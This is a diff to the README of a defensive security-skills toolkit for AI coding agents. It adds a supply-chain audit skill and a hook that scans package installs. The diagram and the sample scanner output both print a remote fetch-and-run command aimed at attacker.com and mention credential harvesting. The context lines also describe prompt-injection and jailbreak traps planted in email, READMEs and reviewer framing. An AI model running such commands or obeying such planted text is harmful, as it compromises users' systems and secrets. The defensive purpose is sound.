@@ -40,6 +40,10 @@ Normal email      →     [calendar invite embedding goal-hijack prompt]
 Normal git repo   →     [README with dormant jailbreak — fires when agent reads it]
 
 "Red-team review" →     [framing that bypasses your critic/verifier model]
+
+AI upgrades pkg   →     npm install analytics@2.x  ← v2.x has postinstall that
+  (v1.x → v2.x)            curl https://attacker.com/c2.sh | bash
+                           runs silently, no diff in your code
 ```
 
 Google DeepMind documented this as **AI Agent Traps** (Franklin, Tomašev et al., 2026) — the first systematic taxonomy of how the environment itself attacks AI agents. The numbers are not theoretical:
@@ -116,11 +120,12 @@ npx skillsover init --tool=copilot       # Copilot
 
 ---
 
-## All 12 skills
+## All 13 skills
 
 | Skill | When to use |
 |-------|-------------|
 | **`/security` ★** | **Before any deploy. Mandatory for code that uses AI agents. Full OWASP + DeepMind 6-category audit.** |
+| **`/supply-chain` ★** | **Before / after any package install. Detects malicious postinstall scripts, version hijacking, credential harvesting, typosquatting — the attack class AI auto-install misses.** |
 | `/safe-edit` | Changing code that currently works in production — characterization tests first, minimal diff |
 | `/review` | Pre-PR: security P0, logic P1, perf P2 — findings only, no filler |
 | `/debug` | Bug/crash/unexpected behavior — 4-phase root cause analysis, never guesses |
@@ -198,6 +203,7 @@ chmod +x ~/.claude/hooks/*.sh
 
 | Hook | Triggers | What happens |
 |------|----------|--------------|
+| `pkg-install-audit` | Before `npm install` / `pip install` / `composer require` / `yarn add` | **Intercepts the install — checks for malicious postinstall scripts, known-compromised packages, typosquats. Blocks if CRITICAL found.** |
 | `pre-push-security` | Before `git push` | Blocks push if `/security` hasn't been run |
 | `safe-edit-guard` | Before editing `*service*`, `*auth*`, `*payment*`... | Warns: use `/safe-edit` for this file |
 | `post-stage-commit` | After `git add` | Reminds: type `/commit` instead of writing manually |
@@ -345,6 +351,48 @@ Status: DONE_WITH_CONCERNS — human review required before shipping
 ```
 
 **Token cost**: ~800-1500 tokens
+
+---
+
+### `/supply-chain` — Package Supply Chain Audit ★
+
+> The attack class AI auto-install introduces. An AI upgrades a package, the new version has a malicious `postinstall` script — your code is clean, the threat is inside `node_modules`.
+
+**When to use**: Before and after any `npm install` / `pip install` / `composer require`. Especially after AI-assisted dependency upgrades.
+
+**What it catches:**
+
+| Attack | How it works | Real examples |
+|--------|-------------|---------------|
+| **Malicious install scripts** | `postinstall` fetches & executes remote payload | event-stream (2018), ua-parser-js (2021) |
+| **Version hijacking** | Maintainer account compromised, malicious code in new version | eslint-scope (2018), coa (2021), rc (2021) |
+| **Intentional sabotage** | Author injects malware into own package | colors v1.4.44 (2022), faker (2022), node-ipc (2022) |
+| **Credential harvesting** | Package reads `process.env.AWS_SECRET_ACCESS_KEY` etc | Multiple npm packages 2022–2024 |
+| **Obfuscated payloads** | Base64-encoded dropper in `index.js` | Dozens of cases/year |
+| **Typosquatting** | `axois` instead of `axios` — one character off | crossenv (targeted cross-env), many others |
+
+**Example output:**
+```
+[CRITICAL] postinstall script fetches remote payload
+Package: analytics-helper@2.0.1
+File: node_modules/analytics-helper/scripts/postinstall.js:14
+Code: exec(curl -s https://attacker[.]com/c2.sh | bash)
+Fix: Remove immediately. Pin to 1.9.4 (last clean version). Rotate env secrets.
+
+[CRITICAL] Credential harvesting — reads AWS_SECRET_ACCESS_KEY
+Package: dev-utils@3.0.1
+File: node_modules/dev-utils/index.js:87
+Fix: Remove. Rotate all secrets. Check if CI/CD was also exposed.
+
+[HIGH] Install script added in v2.x — not present in v1.x
+Package: helper-lib@2.0.0 (upgraded from 1.3.1 in last commit)
+Risk: postinstall added + maintainer changed 8 days before publish
+Fix: Pin to 1.3.1. Investigate upstream.
+```
+
+**Hook**: `pkg-install-audit` fires automatically before every install command — no need to remember to run this manually.
+
+**Token cost**: ~800-2000 tokens (depends on package count)
 
 ---
 
